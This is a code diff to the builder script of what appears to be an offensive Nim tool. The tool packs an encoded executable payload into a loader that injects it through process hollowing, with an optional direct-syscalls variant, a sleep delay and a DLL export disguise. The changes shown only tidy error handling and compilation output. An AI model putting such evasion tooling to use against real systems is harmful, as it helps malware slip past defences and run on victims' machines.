@@ -1,4 +1,4 @@
-import os
+import osproc
 import argparse
 import strformat
 from std/base64 import encode
@@ -51,14 +51,14 @@ when isMainModule:
         arg("injection-method", help="""Injection method
 
         1 - Simple hollowing
-        2 - NimlineWhispers2 hollowing
+        2 - Syscalls hollowing (using NimlineWhispers2)
         """)
         option("-s", "--sponsor", help="Sponsor path to hollow (default: self hollowing)")
         option("-a", "--args", help="Command line arguments to append to the hollowed process")
         option("-f", "--format", help="PE hollower format", choices = @["exe", "dll"], default=some("exe"))
         option("-e", "--exportname", help="DLL export name (relevant only for Dll format)", default=some("DllRegisterServer"))
         option("-t", "--sleep", help="Number of seconds to sleep before hollowing", default=some("0"))
-        flag("-d", "--debug", help="Compile as debug instead of release (verbose)")
+        flag("-d", "--debug", help="Compile as debug instead of release (loader is verbose)")
     # Parse arguments
     try:
         var opts = p.parse()
@@ -78,7 +78,9 @@ when isMainModule:
             echo err.help
             quit(1)
     except UsageError:
-        stderr.writeLine getCurrentExceptionMsg()
+        echo pichichiBanner
+        echo "[-] " & getCurrentExceptionMsg()
+        echo "[i] Use -h / --help\n"
         quit(1)
 
     # Read & compress & encode exe payload
@@ -108,7 +110,7 @@ var sleepSeconds* = {sleepSeconds}
 
     # Change to debug if needed
     if isDebug:
-        discard compileFlags.replace("-d:release ", "")
+        compileFlags = compileFlags.replace("-d:release ", "")
 
     # Compile
     var compileCmd: string
@@ -116,6 +118,13 @@ var sleepSeconds* = {sleepSeconds}
         compileCmd = compileExeCmd & compileFlags & compileOutExe & compileExePath
     elif outFormat == "dll":
         compileCmd = compileDllCmd & compileFlags & compileOutDll & compileDllPath
-    discard execShellCmd(compileCmd)
+    echo "[*] Compiling Loader: " & compileCmd
+    var res = execCmdEx(compileCmd, options={poStdErrToStdOut})
+    if res[1] == 0:
+        echo "[+] Compiled successfully"
+    else:
+        echo "[-] Error compiling. compilation output:"
+        echo res[0]
+
 
     
